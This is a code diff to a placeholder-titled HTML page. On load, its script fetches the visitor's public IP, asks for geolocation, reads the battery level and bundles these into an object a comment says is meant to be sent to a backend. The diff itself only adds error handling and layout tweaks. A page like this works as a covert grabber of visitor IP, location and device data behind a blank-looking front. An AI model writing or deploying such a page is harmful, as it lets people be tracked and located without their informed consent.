@@ -4,11 +4,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Title For The Webpage</title>
+    <title>Title For the Webpage</title>
 </head>
 
 <body>
-    <h1>H1 Tag</h1>
+
+    <center>
+        <h1>H1 tag</h1> <!-- Ensure this element exists -->
+    </center>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
@@ -16,8 +19,14 @@
             fetch("https://api.ipify.org?format=json")
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip;
-                    document.getElementById("ip-address").textContent = ip;
+                    // Check if the IP element exists
+                    const ipElement = document.getElementById("ip-address");
+                    if (ipElement) {
+                        // Display the IP address on the screen
+                        ipElement.textContent = data.ip;
+                    } else {
+                        console.error("IP address element not found");
+                    }
 
                     // Get the location details using Geolocation API
                     if ("geolocation" in navigator) {
@@ -28,7 +37,7 @@
                             navigator.getBattery().then(function(battery) {
                                 // Collect information to send to backend
                                 const details = {
-                                    ip: ip,
+                                    ip: data.ip,
                                     latitude: latitude,
                                     longitude: longitude,
                                     battery_level: battery.level * 100,  // Convert battery level to percentage
@@ -68,7 +77,6 @@
                 });
         });
     </script>
-
 </body>
 
 </html>
